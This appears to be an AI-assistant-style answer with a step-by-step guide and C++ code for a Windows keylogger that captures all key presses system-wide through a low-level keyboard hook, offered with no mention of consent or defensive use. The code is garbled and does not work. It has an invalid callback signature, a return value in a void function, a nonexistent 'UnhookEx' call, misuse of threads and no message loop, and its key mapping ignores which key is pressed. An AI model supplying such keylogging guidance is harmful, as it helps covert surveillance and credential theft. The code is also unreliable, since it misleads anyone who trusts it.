To create a program that logs keystrokes on a Windows computer, you can use the Windows API to set up a keyboard hook. This approach allows you to monitor and record all key presses, including those with modifiers like Shift, Ctrl, and Alt. Here's a step-by-step guide to implementing this:

### Step-by-Step Explanation:

1. **Include Necessary Headers:**
   - Include `windows.h` for Windows API functions.
   - Include `iostream` for input/output operations.

2. **Define the Callback Function:**
   - Define a function that will be called for each key press or release.
   - This function will record the key and any active modifiers (Shift, Ctrl, Alt).

3. **Set Up the Keyboard Hook:**
   - Use `SetWindowsHookEx` with `WH_KEYBOARD_LL` to set a low-level keyboard hook.
   - The hook will be active for all windows, capturing key events globally.

4. **Handle Key Events:**
   - In the callback function, check if the event is a key press (KeyDown) or release.
   - Convert the key number to the corresponding character and note any active modifiers.

5. **Process Events:**
   - Use a loop to continuously check for key events and process them using the callback function.

6. **Clean Up:**
   - Use `UnhookEx` to remove the keyboard hook when the program ends to release system resources.

### Code Implementation:

```cpp
#include <windows.h>
#include <iostream>
using namespace std;

void keyPressCallback(int hKb, int bEvent, int bKey, int bModifiers) {
    if (bEvent == 0) { // Key down event
        char c = ' ';
        if (bModifiers & 0x20) { // Shift is pressed
            c = 'A';
        } else {
            c = 'a';
        }
        if (bModifiers & 0x08) { // Ctrl is pressed
            c = 'C';
        }
        if (bModifiers & 0x04) { // Alt is pressed
            c = 'A';
        }
        if (bModifiers & 0x40) { // Win is pressed
            c = 'W';
        }
        // Additional handling for other keys (e.g., backspace, enter, etc.)

        // Print the key and modifiers
        cout << "Key pressed: " << c << " (";
        if (bModifiers & 0x20) cout << "Shift";
        if (bModifiers & 0x08) cout << " Ctrl";
        if (bModifiers & 0x04) cout << " Alt";
        if (bModifiers & 0x40) cout << " Win";
        cout << ")" << endl;
    } else { // Key up event (not covered here, but can be handled similarly)
        // Log key release if needed
    }
    return 0;
}

int main() {
    #define WH_KEYBOARD_LL 0x00000008
    #define GM_KEYDOWN 0x0001

    void (*callback)(int, int, int, int) callback = keyPressCallback;

    int hook = SetWindowsHookEx(WH_KEYBOARD_LL, callback, 0, 0);

    if (hook == -1) {
        cout << "Failed to set keyboard hook" << endl;
        return 1;
    }

    cout << "Keyboard hook set" << endl;

    // Use a separate thread to avoid blocking the main thread
    thread mainThread([]{
        while (true) {
            Sleep(100); // Check for events every 100ms
        }
    }, 0, 0);

    // Keep the program running until the hook is removed
    while (true) {
        Sleep(100);
    }

    // Cleanup
    if (UnhookEx(hook)) {
        cout << "Unhooked" << endl;
    } else {
        cout << "Failed to unhook" << endl;
    }

    return 0;
}
```

